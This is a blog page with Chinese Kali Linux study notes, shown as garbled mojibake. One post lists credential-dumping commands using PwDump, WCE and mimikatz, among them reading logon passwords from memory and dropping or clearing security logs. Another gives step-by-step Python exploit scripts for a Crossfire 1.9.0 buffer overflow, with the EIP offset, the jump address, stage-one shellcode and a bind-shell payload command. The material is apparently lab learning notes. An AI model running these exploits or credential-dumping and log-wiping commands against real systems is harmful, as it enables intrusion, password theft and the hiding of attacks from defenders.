<li>/usr/share/windows-binaries/fgdump</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>æ“ä½œç³»ç»Ÿä¸ä¿å­˜å¯†ç ï¼Œåªä¿å­˜å¯†ç çš„å“ˆå¸Œå€¼ï¼Œè¾“å…¥ç™»é™†å¯†ç çš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿç»„ä»¶ä¼šå¯¹è¾“å…¥çš„å¯†ç è¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œæ¯”å¯¹å¯†ç æ•°æ®åº“çš„å“ˆå¸Œå€¼
æ“ä½œç³»ç»Ÿä¿å­˜å“ˆå¸Œå€¼ï¼Œæœ‰ä¸¤ä¸ªå€¼ï¼Œä¸€ä¸ªæ˜¯LMHashï¼Œå¦ä¸€ä¸ªæ˜¯NTLMHash
æœ¬åœ°å¯†ç æ•°æ®åº“ï¼šCï¼š\WINDOWS\system32\config\SAM</code></pre></blockquote>
<ul>
<li>Dump SAM<ul>
<li>PwDump.exe -h  </li>
<li>PwDump.exe  -x localhost â–² 2019.12.18å¯¹äº64bitçš„æ“ä½œç³»ç»Ÿï¼Œéœ€è¦åŠ -xå‚æ•°</li>
<li>ä¿å­˜æœåˆ°çš„æ–‡ä»¶ä¸Šä¼ Kali</li>
</ul>
</li>
<li>ophcrack<ul>
<li>load pwdumpæ–‡ä»¶</li>
</ul>
</li>
</ul>
<h4 id="15-WINDOWSèº«ä»½è®¤è¯è¿‡ç¨‹"><a href="#15-WINDOWSèº«ä»½è®¤è¯è¿‡ç¨‹" class="headerlink" title="15. WINDOWSèº«ä»½è®¤è¯è¿‡ç¨‹"></a>15. WINDOWSèº«ä»½è®¤è¯è¿‡ç¨‹</h4><blockquote>
<pre><code>èº«ä»½éªŒè¯ç»„ä»¶ï¼š
Windows NT Logon and Authentication Model
WINLOGON.EXE â†’ LAS AUTH API(LSASRV.DLL) â†’ MSV1_0.DDL(NTLM AUTH PKG)

èº«ä»½éªŒè¯æ–¹å¼ï¼š
Localhost:
æ˜æ–‡cgarcia/å¯†æ–‡pwd1 â†’ h1=LMHash(&quot;pwd1&quot;)/h2=NTHash(&quot;pwd1&quot;) â†’ cmp([h1,h2],SAM) â†’ SAM DATABASE
Network:
1.The cleartxt password is not sent
2.The NTLM protocol is used

èº«ä»½éªŒè¯å…·ä½“æ­¥éª¤ï¼š
å‘é€æ–¹
1.cgarcia/pwd1
2.lmhash=LMHash(&quot;pwd1&quot;)/nthash=NTHash(&quot;pwd2&quot;)
3.Init connection
5.R=f(lmhash/nthash,C)
6.Sends cgarcia,R
æ¥å—æ–¹
4.Responds C=challenge random
7.R&apos;=f(SAM[lmhash/nthash],C)
8.R&apos;== R &gt;&gt;Access Grant/R&apos;&lt;&gt; R&gt;&gt;Access Denied(SAM Database)</code></pre></blockquote>
<h4 id="16-WCEï¼ˆWINDOWS-CREDENTIAL-EDITORï¼‰"><a href="#16-WCEï¼ˆWINDOWS-CREDENTIAL-EDITORï¼‰" class="headerlink" title="16. WCEï¼ˆWINDOWS CREDENTIAL EDITORï¼‰"></a>16. WCEï¼ˆWINDOWS CREDENTIAL EDITORï¼‰</h4><ul>
<li>/usr/share/windows-resources/wceï¼ˆwce32.exe/wce64.exe/wce-universal.exeï¼‰</li>
<li>éœ€è¦ç®¡ç†å‘˜æƒé™</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwce-universal.exe -l</code></strong>ï¼ˆæ˜¾ç¤ºå½“å‰ç³»ç»Ÿå·²ç»ç™»é™†çš„ä¼šè¯è´¦å·ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwce-universal.exe -lv</code></strong>ï¼ˆæ˜¾ç¤ºå½“å‰ç™»é™†ä¼šè¯çš„è¯¦ç»†ä¿¡æ¯ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwce-universal.exe -d</code></strong> LUIDï¼ˆæŒ‡å®šä¸€ä¸ªä¼šè¯ï¼Œç„¶ååˆ é™¤ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwce-universal.exe -e</code></strong>ï¼ˆæŒ‡å®šåˆ·æ–°æ—¶é—´ï¼Œç™»é™†ä¿¡æ¯ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwce-universal.exe -r</code></strong>ï¼ˆæ¯éš”5sé‡æ–°åˆ·æ–°ä¸€æ¬¡ç™»é™†ä¿¡æ¯ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwce-universal.exe -g password</code></strong>ï¼ˆè®¡ç®—LMHashå’ŒNTLMHashï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwce-universal.exe -w</code></strong>ï¼ˆä»å†…å­˜ä¸­è¯»å–Digest Authentication Packageä¸­å­˜çš„æ˜æ–‡å¯†ç ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwce-universal.exe -i LUID -s ç™»é™†ä¿¡æ¯</code></strong>ï¼ˆè¿›è¡Œäº¤äº’å¼ä¿®æ”¹ï¼‰</li>
<li>LM/NT hash</li>
</ul>
<blockquote>
<pre><code>PWDUMPæ˜¯ä»SAM Databaseä¸­è¯»å–ä¿¡æ¯ï¼ŒWCEæ˜¯ä»å†…å­˜ä¸­è¯»å–ä¿¡æ¯</code></pre></blockquote>
<h4 id="17-WCEï¼ˆWINDOWS-CREDENTIAL-EDITORï¼‰"><a href="#17-WCEï¼ˆWINDOWS-CREDENTIAL-EDITORï¼‰" class="headerlink" title="17. WCEï¼ˆWINDOWS CREDENTIAL EDITORï¼‰"></a>17. WCEï¼ˆWINDOWS CREDENTIAL EDITORï¼‰</h4><ul>
<li>ä»å†…å­˜ä¸­è¯»å–LM/NTLM hash</li>
<li>Digest Authentication Package</li>
<li>NTLM Security Package</li>
<li>Kerberos Security</li>
<li>é˜²æ­¢WCEæ”»å‡»</li>
<li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Package<ul>
<li>kerberos</li>
<li>msv1_0</li>
<li>schannet</li>
<li>wdigestï¼ˆæœ¬åœ°è¿æ¥èº«ä»½éªŒè¯ï¼Œè¢«åˆ é™¤åï¼Œåªå…è®¸å•ç”¨æˆ·ç™»é™†ï¼‰â–²2019.12.19èƒ½å•ç”¨æˆ·ç™»é™†</li>
<li>tspkaï¼ˆè¿œç¨‹è¿æ¥èº«ä»½éªŒè¯ï¼‰</li>
<li>pku2u</li>
</ul>
</li>
</ul>
<h4 id="18-å…¶ä»–å·¥å…·"><a href="#18-å…¶ä»–å·¥å…·" class="headerlink" title="18. å…¶ä»–å·¥å…·"></a>18. å…¶ä»–å·¥å…·</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼špwdump locahost</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šfgdump</code></strong>ï¼ˆ/usr/share/windows-binaries/fgdumpï¼‰<ul>
<li>åŒå‡»ä¼šç”Ÿæˆ3ä¸ªæ–‡ä»¶ï¼ˆè°ƒç”¨cachedump/pwdumpï¼‰</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šmimikatz.exe</code></strong>ï¼ˆ/usr/share/windows-resources/minikatzï¼‰<ul>
<li>::ï¼ˆåŒ -hï¼‰</li>
<li>privilege::debugï¼ˆææƒåˆ°debugæƒé™ï¼‰</li>
<li>sekurlsa::logonPasswordsï¼ˆæŸ¥çœ‹å½“å‰å·²ç»åœ¨ç™»é™†çŠ¶æ€çš„ä¼šè¯ä¿¡æ¯ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>sekurlsa
1.kerberosåŸŸç¯å¢ƒçš„è´¦å·å¯†ç ä¿¡æ¯
2.wdigestæœ¬åœ°ç¯å¢ƒçš„æ˜æ–‡ä¿¡æ¯
3.logonPasswordç™»é™†çš„æ‰€æœ‰ä¿¡æ¯
4.minidumpæœ€å°å½¢å¼çš„dump
5.pth hashå€¼çš„å½¢å¼ç™»é™†è´¦å·</code></pre></blockquote>
<blockquote>
<pre><code>process
1.liståˆ—å‡ºå½“å‰è¿›ç¨‹è¡¨
2.start/stopå¼€å¯/ç»“æŸä¸€ä¸ªè¿›ç¨‹
3.suspend/resumeæŒ‚èµ·/å†»ç»“ä¸€ä¸ªè¿›ç¨‹ï¼ˆæ€æ¯’è½¯ä»¶ï¼‰</code></pre></blockquote>
<blockquote>
<pre><code>lsadump
1.sam SAMæ•°æ®åº“è¿›è¡ŒDUMP
2.cache cacheè¯»å–
3.lsa lasè¯»å–
4.hash å“ˆå¸Œå€¼è¯»å–</code></pre></blockquote>
<blockquote>
<pre><code>tsï¼ˆç»ˆç«¯æœåŠ¡ï¼‰
1.multirdpï¼ˆæ‰“ä¸Šè¡¥ä¸ï¼Œå…è®¸å¤šä¸ªç”¨æˆ·è¿›è¡Œç™»é™†ï¼‰</code></pre></blockquote>
<blockquote>
<pre><code>event
1.dropï¼ˆä¸å†äº§ç”Ÿæ–°çš„æ—¥å¿—ï¼Œç™»é™†è¡Œä¸ºä¸ä¼šä¸ºè®°å½•åœ¨æ—¥å¿—ï¼‰
2.clearï¼ˆæ¸…æ¥šæ“ä½œç³»ç»Ÿå®‰å…¨æ€§æ—¥å¿—ï¼‰
3.eventvwræ“ä½œç³»ç»Ÿæ—¥å¿—æŸ¥çœ‹</code></pre></blockquote>
<blockquote>
<pre><code>Misc
1.cmdï¼ˆå¯åŠ¨ä¸€ä¸ªcmdï¼‰
2.regeditï¼ˆå¯åŠ¨æ³¨å†Œè¡¨ï¼‰
3.taskmgrï¼ˆå¯åŠ¨ä»»åŠ¡ç®¡ç†å™¨ï¼‰
4.wifiï¼ˆæŸ¥çœ‹è¿æ¥æ‰€æœ‰wifiçš„æ‰€æœ‰å¯†ç ï¼‰</code></pre></blockquote>
<blockquote>
<pre><code>token
1.whoamiï¼ˆwhoamiå’Œsidï¼‰
2.listï¼ˆè¯¦ç»†åˆ—å‡ºè´¦å·ä¿¡æ¯ï¼Œåç§°ï¼Œæƒé™ï¼ŒSIDï¼‰</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" itemprop="url">Kali Linuxç¬”è®°(äºŒåå…«)ï¼šLinuxç¼“å†²åŒºæº¢å‡º</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-13T20:00:34+08:00">
                2019-12-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  1k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  5 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-FUZZING"><a href="#1-FUZZING" class="headerlink" title="1. FUZZING"></a>1. FUZZING</h4><ul>
<li>Crossfire â–² 2019.12.13å®ä¾‹æœªæ‰¾åˆ°<ul>
<li>å¤šäººåœ¨çº¿RPGåœ¨çº¿</li>
<li>1.9.0ç‰ˆæœ¬æ¥å—å…¥ç«™socketè¿æ¥æ—¶å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´</li>
</ul>
</li>
<li>è°ƒè¯•å·¥å…·<ul>
<li>edb</li>
</ul>
</li>
<li>è¿è¡Œå¹³å°<ul>
<li>Kali i386è™šæ‹Ÿæœº</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>crossfileè¿›è¡Œå®‰è£…ï¼šï¼ˆå·¥ä½œç«¯å£ï¼š13327ï¼‰
mv crossfire.tar.gz /usr/games
cd /usr/games
tar zxpf crossfire.tar.gz
cd crossfire/bin
./crossfireï¼ˆç¼ºå°‘ç»„ä»¶å¯è‡ªè¡Œå®‰è£…ï¼‰</code></pre></blockquote>
<blockquote>
<pre><code>64ä½æ“ä½œç³»ç»Ÿéš¾ä»¥è¿›è¡Œç¼“å†²åŒºæº¢å‡ºï¼Œ32ä½æ“ä½œç³»ç»Ÿè¾ƒå®¹æ˜“è¿›è¡Œç¼“å†²åŒºæº¢å‡º
è°ƒè¯•å·¥å…·ï¼šKali Linux â†’ Reverse Engnieering â†’ Debuggers â†’ edb-degugger</code></pre></blockquote>
<h4 id="2-FUZZING"><a href="#2-FUZZING" class="headerlink" title="2. FUZZING"></a>2. FUZZING</h4><ul>
<li>æ–°ç‰ˆæœ¬Linuxå†…æ ¸æ”¯æŒå†…å­˜ä¿æŠ¤æœºåˆ¶<ul>
<li>DEP</li>
<li>ASLR</li>
<li>å †æ ˆcookies</li>
<li>å †æ ˆç²‰ç¢</li>
</ul>
</li>
</ul>
<h4 id="3-FUZZING"><a href="#3-FUZZING" class="headerlink" title="3. FUZZING"></a>3. FUZZING</h4><ul>
<li>æœ¬æœºè°ƒè¯•ï¼ˆæµ‹è¯•æ—¶ï¼Œæœ€å¥½é™åˆ¶åªèƒ½æœ¬æœºè®¿é—®ï¼Œæ€•æœ‰å…¬ç½‘è®¿é—®æ‰«æï¼‰<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -A INPUT -p tcp --destiantion-port 13327\! -d 127.0.0.1 -j DROP</code></strong></li>
</ul>
</li>
</ul>
<h4 id="4-FUZZING"><a href="#4-FUZZING" class="headerlink" title="4. FUZZING"></a>4. FUZZING</h4><ul>
<li>è§£å‹<ul>
<li>/usr/games</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼štar zxpf crossfire.tar.gz</code></strong></li>
</ul>
</li>
<li>è°ƒè¯•<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šedb --run /usr/games/crossfire/bin/crossfire</code></strong></li>
<li>åœ¨ç•Œé¢Debugä¸‹runä¸¤æ¬¡ï¼Œæ‰èƒ½å¼€å¯edbå‘½ä»¤è¡Œ â†’ waiting for connection</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./01.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=&apos;\x41&apos;*4379</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>crossfireåªæœ‰åœ¨å‘ç”Ÿäº†å›ºå®šå¤§å°çš„å­—èŠ‚åï¼Œä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºï¼Œä¸º4379ä½ï¼ˆ4378ï¼Œ4380ä¹Ÿå¯ä»¥å‘ç”Ÿç¼“å†²åŒºæº¢å‡ºï¼Œä½†æ— æ³•ç²¾ç¡®ä¿®æ”¹EIPçš„å‚æ•°ï¼‰</code></pre></blockquote>
<h4 id="5-FUZZING"><a href="#5-FUZZING" class="headerlink" title="5. FUZZING"></a>5. FUZZING</h4><ul>
<li>å”¯ä¸€å­—ç¬¦ä¸²è¯†åˆ«EIPç²¾ç¡®ä½ç½®<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./usr/share/metasploit-framework/tools/pattern_create.rb 4379</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./02.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>å”¯ä¸€å­—ç¬¦ä¸²è¯†åˆ«EIPç²¾ç¡®ä½ç½®<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./usr/share/metasploit-framework/tools/pattern_offset.rb EIPå¯„å­˜å™¨ä½ç½®</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./03.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=&apos;A&apos;*4368+&apos;B&apos;*4+&apos;C&apos;*7</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>åœ¨æ­¤ç¼“å†²åŒºæº¢å‡ºä¸­ï¼Œå› ä¸ºéœ€è¦åšåˆ°EIPç¼“å†²åŒºçš„ç²¾ç¡®æº¢å‡ºï¼Œæ‰€ä»¥é•¿åº¦å›ºå®šä¸º4379ï¼Œæ„å‘³ç€ESPçš„æº¢å‡ºé•¿åº¦åªæœ‰7ä¸ªå­—ç¬¦ï¼Œä¸é€‚åˆåšShellcodeçš„å­˜æ”¾ä½ç½®</code></pre></blockquote>
<h4 id="6-FUZZING"><a href="#6-FUZZING" class="headerlink" title="6. FUZZING"></a>6. FUZZING</h4><ul>
<li>æ€è·¯ï¼š</li>
<li>ç¬¬ä¸€é˜¶æ®µShellcode<ul>
<li>ESPè·³è½¬åˆ°EAX</li>
<li>åç§»12ä¸ªå­—èŠ‚</li>
</ul>
</li>
<li>setup sound Shellcode2</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./usr/share/metasploit-framework/tools/nasm_shell.rb</code></strong><ul>
<li>add eax,12</li>
<li>jmp exa</li>
<li>\x83\xc0\x0c\xff\xe0\x90\x90ï¼ˆESPå¿…é¡»æ˜¯7ä¸ªå­—ç¬¦ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>EAXå¯„å­˜å™¨åœ¨ä¸åŒæ—¶é—´ï¼Œä¸åŒæ“ä½œç³»ç»Ÿä¸Šçš„ä½ç½®æ˜¯å˜åŒ–çš„ï¼Œåªèƒ½é€šè¿‡ç³»ç»Ÿå›ºå®šæ¨¡å—å»è·³è½¬ï¼Œæ‰èƒ½åšåˆ°å¤šå°æœºå™¨è„šæœ¬çš„å…¼å®¹æ€§ï¼Œå‚ç…§windowsç¼“å†²åŒºæº¢å‡ºçš„JMP ESP</code></pre></blockquote>
<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./03.py</code></strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=&apos;A&apos;*4368+&apos;B&apos;*4+&apos;\x83\xc0\x0c\xff\xe0\x90\x90&apos;</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<pre><code>ä½¿ç”¨æ’ä»¶ï¼šPlugins â†’ OpcodeSearcher â†’ Opcode Search â†’ (EIPâ†’ESP)</code></pre></blockquote>
<h4 id="7-FUZZING"><a href="#7-FUZZING" class="headerlink" title="7. FUZZING"></a>7. FUZZING</h4><ul>
<li>æŸ¥æ‰¾åå­—ç¬¦<ul>
<li>\x00\x0a\x0d\0x20</li>
</ul>
</li>
</ul>
<h4 id="8-FUZZING"><a href="#8-FUZZING" class="headerlink" title="8. FUZZING"></a>8. FUZZING</h4><ul>
<li>ESPè·³è½¬åœ°å€<ul>
<li>Opcode search</li>
<li>crash=â€™\x41â€™*4368+â€™\x97\x45\x13\x08â€™+â€™\x83\xc0\x0c\xff\xe0\x90\x90â€™</li>
</ul>
</li>
<li>è®¾ç½®æ–­ç‚¹ï¼ˆ0x08134597ï¼‰<ul>
<li>EIPâ€“08134597</li>
<li>jmp esp</li>
<li>add eax,12</li>
<li>jmp eax</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./04.py</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=&apos;\x41&apos;*4368+&apos;\x97\x45\x13\x08&apos;+&apos;\x83\xc0\x0c\xff\xe0\x90\x90&apos;</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

<h4 id="9-FUZZING"><a href="#9-FUZZING" class="headerlink" title="9. FUZZING"></a>9. FUZZING</h4><ul>
<li>./msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | ./msfencode -b â€œ\x00\x0a\x0d\0x20â€</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./05.py</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">shellcode=()</span><br><span class="line">crash=shellcode+&apos;A&apos;*(4368-105)+&apos;\x97\x45\x13\x08&apos;+&apos;\x83\xc0\x0c\xff\xe0\x90\x90&apos;</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" itemprop="url">Kali Linuxç¬”è®°(äºŒåä¸ƒ)ï¼šWindowç¼“å†²åŒºæº¢å‡º</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-11T13:03:18+08:00">
                2019-12-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
